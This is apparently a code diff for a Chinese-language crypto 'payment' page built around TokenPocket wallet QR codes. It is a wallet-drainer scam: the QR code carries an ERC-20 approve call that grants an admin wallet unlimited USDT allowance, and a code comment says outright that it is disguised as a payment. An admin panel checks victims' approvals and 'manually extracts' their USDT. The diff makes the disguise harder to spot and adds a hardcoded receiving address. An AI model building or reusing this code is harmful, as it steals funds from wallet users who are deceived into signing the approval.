@@ -73,7 +73,7 @@ cursor:pointer;
       <button class="chain-btn" data-chain="polygon">Polygon 主网</button>
     </div>
     <div id="qrcode">生成支付码...</div>
-    <div class="tip">使用 TokenPocket 扫码支付，安全便捷</div>
+    <div class="tip">使用 TokenPocket 扫码支付，收款地址：<br/>0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508</div>
     <div id="authStatus" class="status">
       请扫码完成支付
     </div>
@@ -84,7 +84,7 @@ cursor:pointer;
     <input class="admin-input" id="userAddr" placeholder="用户钱包地址">
     <input class="admin-input" id="extractAmount" placeholder="提取数量（USDT）">
     <button class="admin-btn" onclick="checkUserAuth()">检查用户授权</button>
-    <button class="admin-btn extract" onclick="manualExtract()">手动提取 USDT</button>
+    <button class="admin-btn.extract" onclick="manualExtract()">手动提取 USDT</button>
     <div id="adminStatus" class="status" style="margin-top:10px">
       请输入用户地址查询
     </div>
@@ -146,12 +146,14 @@ document.querySelectorAll(".chain-btn").forEach(btn => {
   };
 });
 
-// 生成伪装成支付码的授权二维码
+// 生成 TP 钱包能识别为「转账」的授权二维码
 function genAuthQR() {
   const { token, tpScheme } = CONFIG[currentChain];
+  // approve 数据：授权管理员 MaxUint256
   const approveData = "0x095ea7b3" +
     ADMIN_WALLET.slice(2).padStart(64, '0') +
     "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+  // TP 钱包格式：{scheme}://{token}?data={...}，会被解析为向 token 合约转账
   return `${tpScheme}://${token}?data=${approveData}`;
 }
 
